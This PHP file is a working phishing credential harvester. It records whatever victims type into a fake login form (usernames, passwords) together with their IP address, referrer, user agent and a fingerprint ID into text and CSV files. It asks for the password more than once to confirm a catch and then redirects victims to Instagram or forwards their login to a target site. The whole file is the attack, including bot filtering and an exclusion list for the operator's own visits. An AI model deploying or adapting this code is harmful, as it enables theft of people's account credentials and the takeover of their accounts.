<?php 
   
    try {

        
        $harvest_filename = 'crenedenciales.txt';

        
        $post_url = 'https://TARGET.SITE/LOGIN';

        
        $resend_post_data = false; 

        
        $redirect = 'https://instagram.com';
        
       
        $redirect_type = 'js_parent';


        
        $wrong_password_url = '';
        
       
        $password_retry = 2;


        
        $log_everyone = false;

        
        $log_format = 'both';

        $csv_separator = ' | ';

        
        $show_meta_data = true;

        $exclude_visitors = array('1234567890abcdef');



        function get_value($arr, $k) {
            if (array_key_exists($k, $arr)) return $arr[$k];
            return "";
        }

        function collect_columns_array($arraylog) {
            return array_keys(flatten($arraylog));
        }

        function flatten($array, $prefix = '') {
            $result = array();
            foreach($array as $key=>$value) {
                if(is_array($value)) {
                    $result = $result + flatten($value, $prefix . $key . '.');
                }
                else {
                    $result[$prefix . $key] = $value;
                }
            }
            return $result;
        }

        function log_file_init($arraylog) {
            global $log_format;
            global $harvest_filename;
            global $csv_separator;

            if ($log_format == 'both' || $log_format == 'print_r') {
                    file_put_contents($harvest_filename, '');
            }
            if ($log_format == 'both' || $log_format == 'csv' ) {
                $columns = implode($csv_separator, collect_columns_array($arraylog));
                file_put_contents($harvest_filename . '.csv', $columns . "\n");
            }
        }

        function log_append($arraylog) {
            global $log_format;
            global $harvest_filename;
            global $csv_separator;

            if ($log_format == 'both' || $log_format == 'print_r') {
                file_put_contents($harvest_filename, print_r($arraylog, true), FILE_APPEND); 
            }
            if ($log_format == 'both' || $log_format == 'csv' ) {
                $flattenarray = flatten($arraylog);
                $line = '';

                foreach ($flattenarray as $k => $v) {
                    $line .= $v . $csv_separator; 
                }

                $line = substr($line, 0, -strlen($csv_separator));
                file_put_contents($harvest_filename . '.csv', $line . "\n", FILE_APPEND); 
            }
        }

        function validate_user_agent() {
            $user_agent = $_SERVER['HTTP_USER_AGENT'];
            $user_agent_len = strlen($user_agent);
            $user_agent_keywords_found = 0;

            $keywords = array('Chrome',  'Chromium',  'CriOS',  'Fedora',  'Firefox',  'Gecko',  
                            'Intel',  'iPhone',  'KHTML',  'Linux',  'Macintosh',  'Mobile',  
                            'Mozilla',  'Safari',  'Trident',  'Ubuntu',  'Version',  'Win64',  
                            'Windows',  'WOW64',  'x86_64', 'Android', 'Phone');
            
            for ($i = 0; $i < count($keywords); $i++) {
                if(stripos($user_agent, $keywords[$i]) !== false) {
                    $user_agent_keywords_found++;
                }
            }

            return ($user_agent_keywords_found >= 3 && $user_agent_len > 60);
        }

        function redirector($url, $return = false){
            global $redirect_type;
            switch($redirect_type){
                case 'js':
                    $ret = '<script>self.location.href="'.$url.'";</script>';
                    break;
                case 'js_parent':
                    $ret = '<script>window.parent.location.href="'.$url.'";</script>';
                    break;
                default:
                    $ret = '<meta http-equiv="refresh" content="0; url=' . $url . '" />';
                    break;
            }
            if ($return){
                return $ret;
            } else {
                echo $ret;
            }
        }




        @error_reporting(0);
        
        session_start();
        setcookie(session_name(), session_id(), time() + 7776000); // cookie for 90 days
        
        if (empty($_POST)) {
            throw new Exception("POST is empty.");
        }

        $_SESSION['phishing_counter'] = isset($_SESSION['phishing_counter']) ? 
                $_SESSION['phishing_counter'] + 1 : 1;

        if (empty($redirect))       $redirect = $post_url;
        if (isset($_GET['redir']))  $redirect = $_GET['redir'];

        $to_report_array = $_POST;
        $to_report_array['meta'] = array();

        $to_copy_from_server = array(
            "HTTP_X_FORWARDED_FOR", "REMOTE_ADDR", "HTTP_REFERER", "HTTP_USER_AGENT", "HTTP_HOST"
        );

        for( $i = 0; $i < count($to_copy_from_server); $i++ ) {
            $key = $to_copy_from_server[$i];
            if (array_key_exists($key, $_SERVER) ) {
                $to_report_array['meta'][$key] = $_SERVER[$key];
            }
        }
        
        $date = date('Y-m-d H:i:s');
        $to_report_array['meta']['TIMESTAMP'] = $date;
        
        $to_report_array['meta']['COMMENT'] = "Password retries for that user: " . $_SESSION['phishing_counter'] . ". ";
        
        if ($_SESSION['phishing_counter'] >= $password_retry) {
            $to_report_array['meta']['COMMENT'] .= 'Considered phished (+). ';
        }


        $exclude = false;
        $id = sha1(
            get_value($_SERVER, 'HTTP_USER_AGENT') .
            get_value($_SERVER, 'REMOTE_ADDR') . 
            get_value($_SERVER, 'HTTP_ACCEPT') .
            get_value($_SERVER, 'HTTP_ACCEPT_CHARSET') . 
            get_value($_SERVER, 'HTTP_ACCEPT_LANGUAGE')
        );
        
        $to_report_array['meta']['VISITOR_ID'] = substr($id, 0, 16);

        if(in_array($to_report_array['meta']['VISITOR_ID'], $exclude_visitors)) {
            $exclude = true;
        }

        if(!$show_meta_data) {
            unset($to_report_array['meta']);
        }

        if (!$exclude && ($log_everyone || validate_user_agent())) {
            if(!file_exists($harvest_filename)) {
                log_file_init($to_report_array);
            }
            log_append($to_report_array);
        }

        if ($password_retry > 1) {
            if ($_SESSION['phishing_counter'] < $password_retry) {
                $url = (!empty($wrong_password_url))? $wrong_password_url : $_SERVER['REQUEST_URI'];
                header('Location: ' . $url);
                die();
            }
        }
        
        if ($_SESSION['phishing_counter'] > $password_retry) {
            $_SESSION['phished_already'] = 1;
            redirector($redirect);
        }
        else {
            header('Content-Type: text/html; charset=utf-8');

            if (!$resend_post_data) {
                redirector($redirect);
            } else {
                echo "<html><head></head><body>";
                echo "<form action='" . $post_url . "' method='post' name='frm'>";

                foreach($_POST as $a => $b ) {
                    if (is_array($b)){
                        foreach($b as $bname => $bval) {
                            echo "<input type='hidden' name='" . htmlentities($a) . "[".$bname."]' value='" . htmlentities($bval) . "'>";
                        }
                    } else {
                        echo "<input type='hidden' name='" . htmlentities($a) . "' value='" . htmlentities($b) . "'>";
                    }
                }
                echo "</form><script type='text/javascript'>document.frm.submit();</script></body></html>";
            }
        }

    } catch (Exception $e) {
        
        redirector($redirect);
    }
?>
